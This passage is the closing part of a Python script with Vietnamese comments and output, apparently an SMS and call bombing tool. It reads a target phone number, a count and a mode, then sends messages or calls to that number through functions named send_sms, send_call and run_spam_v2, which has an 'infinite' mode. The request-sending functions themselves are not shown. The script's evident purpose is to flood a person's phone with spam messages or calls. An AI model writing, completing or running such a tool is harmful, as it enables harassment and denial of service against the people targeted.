        sys.exit(1)
    
    # Xác định mode
    mode = "sms"
    if len(sys.argv) >= 4:
        mode = sys.argv[3].lower()
    
    # Validate số điện thoại
    phone = re.sub(r'[^0-9+]', '', phone)
    if not phone:
        print(f"{Colors.RED}Số điện thoại không hợp lệ!{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}[{get_time()}] Thông tin:")
    print(f"  Số điện thoại: {phone}")
    print(f"  Số lượng: {count}")
    print(f"  Chế độ: {mode}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    
    # Chạy theo mode
    if mode == "infinite":
        run_spam_v2(phone, count)
    elif mode == "call":
        send_call(phone, count)
    else:  # sms mode (default)
        send_sms(phone, count)
    
    print(f"{Colors.GREEN}[{get_time()}] Chương trình kết thúc!{Colors.RESET}")

if __name__ == "__main__":
    main()